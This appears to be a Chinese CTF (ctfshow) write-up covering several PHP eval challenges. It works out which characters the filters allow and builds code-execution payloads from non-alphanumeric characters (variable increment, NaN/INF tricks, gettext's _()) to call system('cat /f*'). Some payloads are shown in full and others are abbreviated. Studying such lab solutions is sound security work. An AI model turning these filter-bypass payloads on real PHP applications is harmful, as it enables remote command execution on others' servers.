## 一
我们可以看到是过滤了 `(` 和 `.`。那么我们的 `system()` 是不能用了，直接用反引号执行命令的姿势来使用，例如：

```php
code=echo `ls /`;
```

## 二
相关代码片段（节选）：
```php
if(preg_match("/\"|`~\\\\]/",$ctfshow)){
    eval($ctfshow);
}else{
    echo("Are you hacking me AGAIN?");
}
```

我们可以看到过滤的字符集合 `/"|`~\\]/`（注意这是正则的一部分），实际过滤串里有：`"/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/"`。  
我们尝试找出没有被过滤的字符：

```php
for($i=33;$i<127;$i++){
    if(!preg_match("/\"|`~\\\\]/",chr($i))){
        echo chr($i)." ";
    }
}
```

输出显示未被过滤的字符集合：`! $ ' ( ) + , . / ; = [ ] _`。

### 利用思路：变量自增 + 拼接构造关键字
通过 `[]`（空数组）和 `._` 等方式逐字符构造字符串，例如构造 `_POST`，再用可变变量和数组下标调用：

示例构造步骤（摘自题解，已压缩）：
```php
$_=[].'';              // Array (空数组转字符串 -> "Array")
$_=$_[''=='$'];       // 取 "A"
$____='_';            // 下划线开始
$__=$_; $__++; ...    // 通过自增把 A -> P 等字符构造出来
// 最终组合成 "_POST"
$_=$____;
$$_[__]($$_[_]);      // 等价 $_POST[__]($_POST[_]);
```

完整 payload（原文摘录，未编码）:
```
ctf_show=$_=[].'';$_=$_[''=='$'];$____='';$_=$_;$__++;...$_=$____;$$_;&=system&_=cat /f*
```

## 三（长度限制示例）
代码同上：
```php
if(preg_match("/\"|`~\\\\]/",$ctfshow)){
    eval($ctfshow);
}else{ echo("Are you hacking me AGAIN?"); }
```

这题增加了 `if (is_string($ctfshow) && strlen($ctfshow) <= 105)` 的长度限制，需要压缩 payload。

思路：使用 `(0/0)` 和 `(1/0)` 构造 `NaN` 与 `INF`，利用浮点字符串简写减少自增次数：

示例简化构造（官方 wp 摘要）：
```php
$_=(0/0)._;     // NaN_
$_=$_[0];       // N
$__=++$_;       // O
$__=++$_.$__;   // PO
// …
// 最终调用：$_POST[0]($_POST[1]);
```

URL-encoded payload（长度 103 < 105）示例（原文）:
```
ctf_show=%24_%3D(0%2F0)._%3B...&0=system&1=cat /f*
```

## 四（进一步缩短到 84）
可用字符集合变化为：`$ ( ) + , . / 0 ; = [ ] _`，通过 `(_/_._)[0]` 等更简洁的表达式得到 `N`，最终生成 payload，长度正好满足限制。

示例（简化）:
```
ctf_show=%24_%3D(_%2F_._)%5B0%5D%3B%3B...&0=system&_=cat /f*
```

也可以使用 Burp 的不可见字符 `%FF` 绕过（留到下一题讨论）。

## 五（长度 73，0 不可用）
此处用到了 `phpinfo()` 中启用的 `gettext` 扩展，使用 `_()` 函数（`gettext()` 的别名）把表达式转换为字符串，再取 `[0]` 得到字符 `'N'`：

官方更短的 payload（原文含不可见变量）示例：
```
ctf_show=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&_=system&%ff=cat /f*
```

官方 WP 也给出了更短的实现（参考）：https://blog.csdn.net/qq_38798840/article/details/130944199
